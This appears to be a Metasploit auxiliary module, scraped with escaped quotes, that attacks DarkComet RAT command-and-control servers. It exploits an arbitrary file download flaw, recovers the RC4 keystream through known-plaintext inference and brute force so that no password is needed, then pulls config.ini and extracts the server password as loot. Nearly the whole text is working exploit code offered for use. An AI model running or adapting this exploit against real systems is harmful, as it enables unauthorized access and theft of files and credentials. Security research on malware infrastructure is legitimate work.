# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;DarkComet Server Remote File Download Exploit&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary file download vulnerability in the DarkComet C&C server versions 3.2 and up.
        The exploit does not need to know the password chosen for the bot/server communication.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Shawn Denbow & Jesse Hertz&#039;, # Vulnerability Discovery
          &#039;Jos Wetzels&#039; # Metasploit module, added support for versions < 5.1, removed need to know password via cryptographic attack
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/PEST-CONTROL.pdf&#039; ],
          [ &#039;URL&#039;, &#039;http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 08 2012&#039;,
      &#039;Platform&#039;       => &#039;win&#039;
    ))
 
    register_options(
      [
        Opt::RPORT(1604),
        Opt::RHOST(&#039;0.0.0.0&#039;),
 
        OptString.new(&#039;LHOST&#039;, [true, &#039;This is our IP (as it appears to the DarkComet C2 server)&#039;, &#039;0.0.0.0&#039;]),
        OptBool.new(&#039;NEWVERSION&#039;, [false, &#039;Set to true if DarkComet version >= 5.1, set to false if version < 5.1&#039;, true]),
        OptString.new(&#039;TARGETFILE&#039;, [false, &#039;Target file to download (assumes password is set)&#039;, &#039;&#039;]),
        OptBool.new(&#039;STORE_LOOT&#039;, [false, &#039;Store file in loot (will simply output file to console if set to false).&#039;, true]),
        OptInt.new(&#039;BRUTETIMEOUT&#039;, [false, &#039;Timeout (in seconds) for bruteforce attempts&#039;, 1])
 
      ], self.class)
  end
 
  # Functions for XORing two strings, deriving keystream using known plaintext and applying keystream to produce ciphertext
  def xor_strings(s1, s2)
    s1.unpack(&#039;C*&#039;).zip(s2.unpack(&#039;C*&#039;)).map { |a, b| a ^ b }.pack(&#039;C*&#039;)
  end
 
  def get_keystream(ciphertext, known_plaintext)
    c = [ciphertext].pack(&#039;H*&#039;)
    if known_plaintext.length > c.length
      return xor_strings(c, known_plaintext[0, c.length])
    elsif c.length > known_plaintext.length
      return xor_strings(c[0, known_plaintext.length], known_plaintext)
    else
      return xor_strings(c, known_plaintext)
    end
  end
 
  def use_keystream(plaintext, keystream)
    if keystream.length > plaintext.length
      return xor_strings(plaintext, keystream[0, plaintext.length]).unpack(&#039;H*&#039;)[0].upcase
    else
      return xor_strings(plaintext, keystream).unpack(&#039;H*&#039;)[0].upcase
    end
  end
 
  # Use RubyRC4 functionality (slightly modified from Max Prokopiev&#039;s implementation https://github.com/maxprokopiev/ruby-rc4/blob/master/lib/rc4.rb)
  # since OpenSSL requires at least 128-bit keys for RC4 while DarkComet supports any keylength
  def rc4_initialize(key)
    @q1 = 0
    @q2 = 0
    @key = []
    key.each_byte { |elem| @key << elem } while @key.size < 256
    @key.slice!(256..@key.size - 1) if @key.size >= 256
    @s = (0..255).to_a
    j = 0
    0.upto(255) do |i|
      j = (j + @s[i] + @key[i]) % 256
      @s[i], @s[j] = @s[j], @s[i]
    end
  end
 
  def rc4_keystream
    @q1 = (@q1 + 1) % 256
    @q2 = (@q2 + @s[@q1]) % 256
    @s[@q1], @s[@q2] = @s[@q2], @s[@q1]
    @s[(@s[@q1] + @s[@q2]) % 256]
  end
 
  def rc4_process(text)
    text.each_byte.map { |i| (i ^ rc4_keystream).chr }.join
  end
 
  def dc_encryptpacket(plaintext, key)
    rc4_initialize(key)
    rc4_process(plaintext).unpack(&#039;H*&#039;)[0].upcase
  end
 
  # Try to execute the exploit
  def try_exploit(exploit_string, keystream, bruting)
    connect
    idtype_msg = sock.get_once(12)
 
    if idtype_msg.length != 12
      disconnect
      return nil
    end
 
    if datastore[&#039;KEY&#039;] != &#039;&#039;
      exploit_msg = dc_encryptpacket(exploit_string, datastore[&#039;KEY&#039;])
    else
      # If we don&#039;t have a key we need enough keystream
      if keystream.nil?
        disconnect
        return nil
      end
 
      if keystream.length < exploit_string.length
        disconnect
        return nil
      end
 
      exploit_msg = use_keystream(exploit_string, keystream)
    end
 
    sock.put(exploit_msg)
 
    if bruting
      begin
        ack_msg = sock.timed_read(3, datastore[&#039;BRUTETIMEOUT&#039;])
      rescue Timeout::Error
        disconnect
        return nil
      end
    else
      ack_msg = sock.get_once(3)
    end
 
    if ack_msg != "\x41\x00\x43"
      disconnect
      return nil
    # Different protocol structure for versions >= 5.1
    elsif datastore[&#039;NEWVERSION&#039;] == true
      if bruting
        begin
          filelen = sock.timed_read(10, datastore[&#039;BRUTETIMEOUT&#039;]).to_i
        rescue Timeout::Error
          disconnect
          return nil
        end
      else
        filelen = sock.get_once(10).to_i
      end
      if filelen == 0
        disconnect
        return nil
      end
 
      if datastore[&#039;KEY&#039;] != &#039;&#039;
        a_msg = dc_encryptpacket(&#039;A&#039;, datastore[&#039;KEY&#039;])
      else
        a_msg = use_keystream(&#039;A&#039;, keystream)
      end
 
      sock.put(a_msg)
 
      if bruting
        begin
          filedata = sock.timed_read(filelen, datastore[&#039;BRUTETIMEOUT&#039;])
        rescue Timeout::Error
          disconnect
          return nil
        end
      else
        filedata = sock.get_once(filelen)
      end
 
      if filedata.length != filelen
        disconnect
        return nil
      end
 
      sock.put(a_msg)
      disconnect
      return filedata
    else
      filedata = &#039;&#039;
 
      if bruting
        begin
          msg = sock.timed_read(1024, datastore[&#039;BRUTETIMEOUT&#039;])
        rescue Timeout::Error
          disconnect
          return nil
        end
      else
        msg = sock.get_once(1024)
      end
 
      while (!msg.nil?) && (msg != &#039;&#039;)
        filedata += msg
        if bruting
          begin
            msg = sock.timed_read(1024, datastore[&#039;BRUTETIMEOUT&#039;])
          rescue Timeout::Error
            break
          end
        else
          msg = sock.get_once(1024)
        end
      end
 
      disconnect
 
      if filedata == &#039;&#039;
        return nil
      else
        return filedata
      end
    end
  end
 
  # Fetch a GetSIN response from C2 server
  def fetch_getsin
    connect
    idtype_msg = sock.get_once(12)
 
    if idtype_msg.length != 12
      disconnect
      return nil
    end
 
    keystream = get_keystream(idtype_msg, &#039;IDTYPE&#039;)
    server_msg = use_keystream(&#039;SERVER&#039;, keystream)
    sock.put(server_msg)
 
    getsin_msg = sock.get_once(1024)
    disconnect
    getsin_msg
  end
 
  # Carry out the crypto attack when we don&#039;t have a key
  def crypto_attack(exploit_string)
    getsin_msg = fetch_getsin
    if getsin_msg.nil?
      return nil
    end
 
    getsin_kp = &#039;GetSIN&#039; + datastore[&#039;LHOST&#039;] + &#039;|&#039;
    keystream = get_keystream(getsin_msg, getsin_kp)
 
    if keystream.length < exploit_string.length
      missing_bytecount = exploit_string.length - keystream.length
 
      print_status("Missing #{missing_bytecount} bytes of keystream ...")
 
      inferrence_segment = &#039;&#039;
      brute_max = 4
 
      if missing_bytecount > brute_max
        print_status("Using inferrence attack ...")
 
        # Offsets to monitor for changes
        target_offset_range = []
        for i in (keystream.length + brute_max)..(keystream.length + missing_bytecount - 1)
          target_offset_range << i
        end
 
        # Store inference results
        inference_results = {}
 
        # As long as we haven&#039;t fully recovered all offsets through inference
        # We keep our observation window in a circular buffer with 4 slots with the buffer running between [head, tail]
        getsin_observation = [&#039;&#039;] * 4
        buffer_head = 0
 
        for i in 0..2
          getsin_observation[i] = [fetch_getsin].pack(&#039;H*&#039;)
          Rex.sleep(0.5)
        end
 
        buffer_tail = 3
 
        # Actual inference attack happens here
        while !target_offset_range.empty?
          getsin_observation[buffer_tail] = [fetch_getsin].pack(&#039;H*&#039;)
          Rex.sleep(0.5)
 
          # We check if we spot a change within a position between two consecutive items within our circular buffer
          target_offset_range.each do |x|
            index = buffer_head
 
            while index != buffer_tail do
              next_index = (index + 1) % 4
 
              # The condition we impose is that observed character x has to differ between two observations and the character left of it has to differ in those same
              if (getsin_observation[index][x] != getsin_observation[next_index][x]) && (getsin_observation[index][x - 1] != getsin_observation[next_index][x - 1]) && ((getsin_observation[(index - 1) % 4][x - 1] == getsin_observation[index][x - 1]) || (getsin_observation[next_index][x - 1] == getsin_observation[(next_index + 1) % 4][x - 1]))
                target_offset_range.delete(x)
                inference_results[x] = xor_strings(getsin_observation[index][x], &#039;9&#039;)
                break
              end
              index = next_index
            end
          end
 
          # Update circular buffer head & tail
          buffer_tail = (buffer_tail + 1) % 4
          # Move head to right once tail wraps around, discarding oldest item in circular buffer
          if buffer_tail == buffer_head
            buffer_head = (buffer_head + 1) % 4
          end
        end
 
        # Inferrence attack done, reconstruct final keystream segment
        inf_seg = ["\x00"] * (keystream.length + missing_bytecount)
        inferrence_results.each do |x, val|
          inf_seg[x] = val
        end
 
        inferrence_segment = inf_seg.slice(keystream.length + brute_max, inf_seg.length).join
        missing_bytecount = brute_max
      end
 
      if missing_bytecount > brute_max
        print_status("Improper keystream recovery ...")
        return nil
      end
 
      print_status("Initiating brute force ...")
 
      # Bruteforce first missing_bytecount bytes of timestamp (maximum of brute_max)
      charset = [&#039;1&#039;, &#039;2&#039;, &#039;3&#039;, &#039;4&#039;, &#039;5&#039;, &#039;6&#039;, &#039;7&#039;, &#039;8&#039;, &#039;9&#039;, &#039;0&#039;]
      char_range = missing_bytecount.times.map { charset }
      char_range.first.product(*char_range[1..-1]) do |x|
        p = x.join
        candidate_plaintext = getsin_kp + p
        candidate_keystream = get_keystream(getsin_msg, candidate_plaintext) + inferrence_segment
        filedata = try_exploit(exploit_string, candidate_keystream, true)
 
        if !filedata.nil?
          return filedata
        end
      end
      return nil
    end
 
    try_exploit(exploit_string, keystream, false)
  end
 
  def parse_password(filedata)
    filedata.each_line { |line|
      elem = line.strip.split(&#039;=&#039;)
      if elem.length >= 1
        if elem[0] == &#039;PASSWD&#039;
          if elem.length == 2
            return elem[1]
          else
            return &#039;&#039;
          end
        end
      end
    }
    return nil
  end
 
  def run
    # Determine exploit string
    if datastore[&#039;NEWVERSION&#039;] == true
      if (datastore[&#039;TARGETFILE&#039;] != &#039;&#039;) && (datastore[&#039;KEY&#039;] != &#039;&#039;)
        exploit_string = &#039;QUICKUP1|&#039; + datastore[&#039;TARGETFILE&#039;] + &#039;|&#039;
      else
        exploit_string = &#039;QUICKUP1|config.ini|&#039;
      end
    elsif (datastore[&#039;TARGETFILE&#039;] != &#039;&#039;) && (datastore[&#039;KEY&#039;] != &#039;&#039;)
      exploit_string = &#039;UPLOAD&#039; + datastore[&#039;TARGETFILE&#039;] + &#039;|1|1|&#039;
    else
      exploit_string = &#039;UPLOADconfig.ini|1|1|&#039;
    end
 
    # Run exploit
    if datastore[&#039;KEY&#039;] != &#039;&#039;
      filedata = try_exploit(exploit_string, nil, false)
    else
      filedata = crypto_attack(exploit_string)
    end
 
    # Harvest interesting credentials, store loot
    if !filedata.nil?
      # Automatically try to extract password from config.ini if we haven&#039;t set a key yet
      if datastore[&#039;KEY&#039;] == &#039;&#039;
        password = parse_password(filedata)
        if password.nil?
          print_status("Could not find password in config.ini ...")
        elsif password == &#039;&#039;
          print_status("C2 server uses empty password!")
        else
          print_status("C2 server uses password [#{password}]")
        end
      end
 
      # Store to loot
      if datastore[&#039;STORE_LOOT&#039;] == true
        print_status("Storing data to loot...")
        if (datastore[&#039;KEY&#039;] == &#039;&#039;) && (datastore[&#039;TARGETFILE&#039;] != &#039;&#039;)
          store_loot("darkcomet.file", "text/plain", datastore[&#039;RHOST&#039;], filedata, &#039;config.ini&#039;, "DarkComet C2 server config file")
        else
          store_loot("darkcomet.file", "text/plain", datastore[&#039;RHOST&#039;], filedata, datastore[&#039;TARGETFILE&#039;], "File retrieved from DarkComet C2 server")
        end
      else
        print_status(filedata.to_s)
      end
    else
      print_status("Attack failed or empty config file encountered ...")
    end
  end
end

